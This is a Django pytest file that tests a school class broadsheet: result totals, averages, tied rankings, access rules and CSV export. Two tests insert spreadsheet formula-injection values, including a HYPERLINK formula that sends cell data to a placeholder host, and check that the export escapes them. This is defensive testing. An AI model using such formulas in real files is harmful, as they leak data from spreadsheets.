"""The class broadsheet (HTML and CSV) over the computed accuracy dataset."""

import csv
import io
from datetime import date
from decimal import Decimal

import pytest
from django.urls import reverse
from django_tenants.utils import schema_context

from apps.academics.models import AcademicSession, ClassArm, ClassLevel, FormTeacher
from apps.accounts.roles import set_roles
from apps.results.models import ClassResult, ResultSummary, SubjectResult
from tests.accounts.factories import StaffFactory
from tests.accounts.helpers import login_verified
from tests.results.factories import accuracy_world, approve_and_compute
from tests.results.test_accuracy import EXPECTED_STATS, EXPECTED_SUBJECTS, SUBJECTS

pytestmark = pytest.mark.django_db

ORDINALS = {1: "1st", 2: "2nd", 3: "3rd", 4: "4th", 5: "5th", 6: "6th"}
# letter -> (total, average, position), in broadsheet order (position, then name).
EXPECTED_ROWS = [
    ("F", "256.0", "85.33", 1),
    ("A", "230.0", "76.67", 2),
    ("B", "220.0", "73.33", 3),
    ("C", "220.0", "73.33", 3),
    ("D", "160.0", "53.33", 5),
    ("E", "119.0", "39.67", 6),
]
SUBJECT_COLUMNS = sorted(SUBJECTS)


@pytest.fixture
def w(school_a):
    with schema_context("school_a"):
        yield accuracy_world()


@pytest.fixture
def computed(w):
    approve_and_compute(w)
    return w


def url(w, name="results:broadsheet"):
    return reverse(name, args=[w.arm.pk, w.term.pk])


def expected_cells(letter):
    by_subject = {
        name: Decimal(total)
        for name, (total, _g, _p) in zip(SUBJECTS, EXPECTED_SUBJECTS[letter], strict=True)
    }
    return [by_subject[name] for name in SUBJECT_COLUMNS]


def test_broadsheet_matches_the_accuracy_dataset(client_a, computed):
    w = computed
    login_verified(client_a, w.principal)
    r = client_a.get(url(w))
    assert r.status_code == 200
    ctx = r.context
    assert ctx["ready"] is True
    assert [c["name"] for c in ctx["subjects"]] == SUBJECT_COLUMNS
    rows = ctx["rows"]
    assert [row["admission_number"] for row in rows] == [
        w.students[letter].admission_number for letter, *_ in EXPECTED_ROWS
    ]
    for row, (letter, total, average, position) in zip(rows, EXPECTED_ROWS, strict=True):
        assert row["name"] == f"Pupil {letter}"
        assert row["totals"] == expected_cells(letter)
        assert (str(row["total"]), str(row["average"]), row["position"]) == (
            total,
            average,
            ORDINALS[position],
        )
    footer = {f["label"]: f["values"] for f in ctx["footer"]}
    for i, name in enumerate(SUBJECT_COLUMNS):
        highest, lowest, average = EXPECTED_STATS[name]
        assert footer["Highest"][i] == Decimal(highest)
        assert footer["Lowest"][i] == Decimal(lowest)
        assert str(footer["Average"][i]) == average
    assert ctx["out_of"] == 6
    html = r.content.decode()
    assert "Pupil F" in html and "85.33" in html and "67.17" in html
    assert html.count(">3rd<") == 2  # B and C tie on 73.33; nobody is 4th
    assert ">4th<" not in html


def test_footer_ignores_blank_cells_and_reads_stored_rows(client_a, computed):
    """Stats come from the stored subject results (never recomputed); a student without a
    result in a subject shows a blank that the footer ignores."""
    w = computed
    SubjectResult.objects.filter(
        student=w.students["E"], offering=w.offerings["Mathematics"], term=w.term
    ).delete()
    login_verified(client_a, w.principal)
    r = client_a.get(url(w))
    maths = SUBJECT_COLUMNS.index("Mathematics")
    row_e = next(row for row in r.context["rows"] if row["name"] == "Pupil E")
    assert row_e["totals"][maths] is None
    footer = {f["label"]: f["values"] for f in r.context["footer"]}
    # 80, 80, 60, 55, 98 -> lowest 55, average 74.60
    assert footer["Lowest"][maths] == Decimal("55")
    assert str(footer["Average"][maths]) == "74.60"


def test_who_may_see_the_broadsheet(client_a, computed):
    w = computed
    for user in (w.principal, w.admin):
        login_verified(client_a, user)
        assert client_a.get(url(w)).status_code == 200
    for user in (w.proprietor, w.ft):
        client_a.force_login(user)
        assert client_a.get(url(w)).status_code == 200
    client_a.force_login(w.teacher)  # teaches the class but is not its form teacher
    assert client_a.get(url(w)).status_code == 403
    assert client_a.get(url(w, "results:broadsheet_csv")).status_code == 403
    client_a.force_login(w.students["A"].user)
    assert client_a.get(url(w)).status_code == 403
    assert client_a.get(url(w, "results:broadsheet_csv")).status_code == 403


def test_not_ready_before_approval(client_a, w):
    ClassResult.objects.create(arm=w.arm, term=w.term, status=ClassResult.Status.REVIEWED)
    login_verified(client_a, w.principal)
    r = client_a.get(url(w))
    assert r.status_code == 200
    html = r.content.decode()
    assert "Results not ready" in html
    assert "Pupil A" not in html
    assert client_a.get(url(w, "results:broadsheet_csv")).status_code == 409


def test_not_ready_while_approved_but_not_yet_computed(client_a, w):
    ClassResult.objects.create(arm=w.arm, term=w.term, status=ClassResult.Status.APPROVED)
    login_verified(client_a, w.principal)
    r = client_a.get(url(w))
    assert r.status_code == 200
    assert "Results not ready" in r.content.decode()


def test_published_class_is_visible(client_a, computed):
    w = computed
    ClassResult.objects.filter(arm=w.arm, term=w.term).update(status="published")
    client_a.force_login(w.ft)
    r = client_a.get(url(w))
    assert r.status_code == 200 and r.context["ready"] is True


def test_bad_or_unknown_ids_are_404(client_a, computed):
    w = computed
    login_verified(client_a, w.principal)
    for args in (
        ["abc", w.term.pk],
        [w.arm.pk, "1e3"],
        [w.arm.pk + 999, w.term.pk],
        [w.arm.pk, w.term.pk + 999],
        ["9" * 19, w.term.pk],
    ):
        assert client_a.get(reverse("results:broadsheet", args=args)).status_code == 404
        assert client_a.get(reverse("results:broadsheet_csv", args=args)).status_code == 404


def test_csv_matches_and_is_guarded(client_a, computed):
    w = computed
    st = w.students["A"]
    st.first_name = "=HYPERLINK(1)"
    st.save(update_fields=["first_name"])
    login_verified(client_a, w.principal)
    r = client_a.get(url(w, "results:broadsheet_csv"))
    assert r.status_code == 200
    assert r["Content-Type"].startswith("text/csv")
    assert r["Content-Disposition"].startswith("attachment;")
    assert r["Cache-Control"] == "no-store"
    rows = list(csv.reader(io.StringIO(r.content.decode())))
    assert rows[0] == [
        "admission_number",
        "name",
        *SUBJECT_COLUMNS,
        "total",
        "average",
        "position",
    ]
    body = rows[1 : 1 + len(EXPECTED_ROWS)]
    for cols, (letter, total, average, position) in zip(body, EXPECTED_ROWS, strict=True):
        name = "'=HYPERLINK(1) A" if letter == "A" else f"Pupil {letter}"
        assert cols[1] == name
        assert cols[0] == w.students[letter].admission_number
        assert [Decimal(c) for c in cols[2:5]] == expected_cells(letter)
        assert cols[5:] == [total, average, ORDINALS[position]]
    footer = rows[1 + len(EXPECTED_ROWS) :]
    assert [f[0] for f in footer] == ["Highest", "Lowest", "Average"]
    averages = footer[2][2:5]
    assert averages == [EXPECTED_STATS[name][2] for name in SUBJECT_COLUMNS]


def test_broadsheet_link_on_class_status_page(client_a, computed):
    w = computed
    client_a.force_login(w.ft)
    html = client_a.get(reverse("results:class_status", args=[w.arm.pk])).content.decode()
    assert url(w) in html
    assert ResultSummary.objects.filter(arm=w.arm, term=w.term).count() == 6


def test_csv_header_subject_names_are_guarded(client_a, computed):
    w = computed
    evil = '=HYPERLINK("http://x/?"&A2,"Maths")'
    SubjectResult.objects.filter(offering=w.offerings["Mathematics"], term=w.term).update(
        subject_name=evil
    )
    login_verified(client_a, w.principal)
    r = client_a.get(url(w, "results:broadsheet_csv"))
    header = next(csv.reader(io.StringIO(r.content.decode())))
    assert "'" + evil in header
    assert evil not in header


def test_form_teacher_of_another_arm_or_session_is_refused(client_a, computed):
    w = computed
    level = ClassLevel.objects.create(name="JSS 8", section="jss", order=98)
    other_arm = ClassArm.objects.create(level=level, suffix="Q")
    other_ft = StaffFactory()
    set_roles(other_ft, ["teacher"], by=None)
    FormTeacher.objects.create(arm=other_arm, session=w.session, teacher=other_ft)
    client_a.force_login(other_ft)
    assert client_a.get(url(w)).status_code == 403
    assert client_a.get(url(w, "results:broadsheet_csv")).status_code == 403

    later = AcademicSession.objects.create(
        name="2027/2028", start_date=date(2027, 9, 1), end_date=date(2028, 7, 31)
    )
    next_ft = StaffFactory()
    set_roles(next_ft, ["teacher"], by=None)
    FormTeacher.objects.create(arm=w.arm, session=later, teacher=next_ft)
    client_a.force_login(next_ft)  # this arm's form teacher, but in another session
    assert client_a.get(url(w)).status_code == 403
    assert client_a.get(url(w, "results:broadsheet_csv")).status_code == 403
